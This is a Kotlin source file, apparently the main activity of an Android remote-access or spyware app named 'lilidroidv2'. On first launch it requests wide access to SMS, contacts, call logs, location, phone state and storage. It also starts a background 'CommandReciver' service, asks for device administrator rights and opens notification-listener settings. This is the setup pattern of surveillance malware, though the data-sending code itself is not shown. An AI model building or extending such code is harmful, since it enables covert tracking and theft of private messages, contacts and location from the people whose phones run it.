package com.example.lilidroidv2

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.Window
import android.view.WindowManager
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat


class MainActivity : AppCompatActivity() {
    val TAG = AppInfo.TAG

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP_MR1)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        supportActionBar?.hide()
        setContentView(R.layout.activity_main)
        checkPermission();
        val isFirstRun = getSharedPreferences(AppInfo.isServiceRunning, MODE_PRIVATE)
        if(isFirstRun.getBoolean(AppInfo.FirstRunKey,true)) {
            Log.d(TAG,"First run successfully")
            val commandReciverService = CommandReciver::class.java
            val commandrecive = Intent(applicationContext, commandReciverService)
            startService(commandrecive)
            getDeviceAdminPermission()
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            val changeRunEntry = isFirstRun.edit()
            changeRunEntry.putBoolean(AppInfo.FirstRunKey,false)
            changeRunEntry.apply()
        }else{
            Log.d(TAG,"Lilidroid service is already running")
        }

    }

    private fun getDeviceAdminPermission(){
        val mDeviceAdminSample = ComponentName(this, DevAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample)
        this.startActivityForResult(intent, 0)
    }

    private fun checkPermission() {
        val permissionCode = 1
        val permission = arrayOf<String>(
            Manifest.permission.INTERNET,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.QUERY_ALL_PACKAGES,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.SET_WALLPAPER,
            Manifest.permission.SEND_SMS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        )
        if (!hasPermissions(this, *permission)) {
            ActivityCompat.requestPermissions(this, permission, permissionCode)
        }
    }

    private fun hasPermissions(context: Context?, vararg permissions: String?): Boolean {
        if (context != null) {
            for (permission in permissions) {
                if (ActivityCompat.checkSelfPermission(
                        context,
                        permission!!
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    return false
                }
            }
        }
        return true
    }

}